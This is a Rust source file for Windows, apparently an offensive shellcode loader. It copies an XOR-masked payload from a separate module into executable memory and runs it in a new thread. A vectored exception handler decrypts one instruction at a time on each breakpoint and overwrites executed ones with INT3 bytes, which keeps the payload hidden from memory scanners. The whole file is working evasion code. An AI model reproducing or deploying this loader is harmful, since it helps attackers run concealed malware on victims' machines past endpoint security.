use std::collections::HashMap;
use std::ptr;
use windows::Win32::Foundation::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};
use windows::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, EXCEPTION_POINTERS, EXCEPTION_BREAKPOINT,
};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, VirtualProtect, MEM_COMMIT, MEM_RELEASE, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::Threading::{CreateThread, WaitForSingleObject, INFINITE};

mod payload;

static mut PAYLOAD_BASE: *mut u8 = ptr::null_mut();
static mut PAYLOAD_SIZE: usize = 0;
static mut EXECUTED_ASM: Option<HashMap<usize, Vec<u8>>> = None;
static mut CLEAN_QUEUE: Option<Vec<(usize, usize)>> = None;

unsafe extern "system" fn veh_payload(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let exception_record = &*(*exception_info).ExceptionRecord;
    let context_record = &mut *(*exception_info).ContextRecord;

    let exception_address = exception_record.ExceptionAddress as *const u8;
    if exception_address >= PAYLOAD_BASE && exception_address < PAYLOAD_BASE.add(PAYLOAD_SIZE) {
        if exception_record.ExceptionCode.0 as u32 == EXCEPTION_BREAKPOINT.0 as u32 {
            let clean_queue = CLEAN_QUEUE.as_mut().unwrap();
            for (offset, len) in clean_queue.drain(..) {
                let addr = PAYLOAD_BASE.add(offset);
                for i in 0..len {
                    *addr.add(i) = 0xcc; // INT3
                }
            }

            let rip = context_record.Rip as *mut u8;
            let offset = rip as usize - PAYLOAD_BASE as usize;

            let executed_asm = EXECUTED_ASM.as_ref().unwrap();
            if let Some(encrypted_instruction) = executed_asm.get(&offset) {
                let mut decrypted_instruction = encrypted_instruction.clone();
                for i in 0..decrypted_instruction.len() {
                    decrypted_instruction[i] ^= payload::XOR_KEY[i % payload::XOR_KEY.len()];
                }

                for i in 0..decrypted_instruction.len() {
                    *rip.add(i) = decrypted_instruction[i];
                }

                // Don't re-mask "MZ" headers
                if decrypted_instruction.len() == 2 && decrypted_instruction[0] == b'M' && decrypted_instruction[1] == b'Z' {
                    // Do nothing
                } else {
                    clean_queue.push((offset, decrypted_instruction.len()));
                }

                return EXCEPTION_CONTINUE_EXECUTION.0;
            }
        }
    }

    EXCEPTION_CONTINUE_SEARCH.0
}

fn main() {
    unsafe {
        PAYLOAD_SIZE = payload::MASKED_PAYLOAD.len();
        EXECUTED_ASM = Some(payload::init_map());
        CLEAN_QUEUE = Some(Vec::new());

        PAYLOAD_BASE = VirtualAlloc(
            ptr::null_mut(),
            PAYLOAD_SIZE,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        ) as *mut u8;

        if PAYLOAD_BASE.is_null() {
            panic!("Failed to allocate memory for payload");
        }

        ptr::copy_nonoverlapping(
            payload::MASKED_PAYLOAD.as_ptr(),
            PAYLOAD_BASE,
            PAYLOAD_SIZE,
        );

        let mut old_protect = 0;
        if !VirtualProtect(
            PAYLOAD_BASE as _,
            PAYLOAD_SIZE,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ).as_bool()
        {
            panic!("Failed to set memory protections");
        }

        if AddVectoredExceptionHandler(1, Some(veh_payload)).is_null() {
            panic!("Failed to install VEH");
        }

        let thread_handle = CreateThread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(PAYLOAD_BASE)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        ).unwrap();

        WaitForSingleObject(thread_handle, INFINITE);

        VirtualFree(PAYLOAD_BASE as _, 0, MEM_RELEASE).unwrap();
    }
}
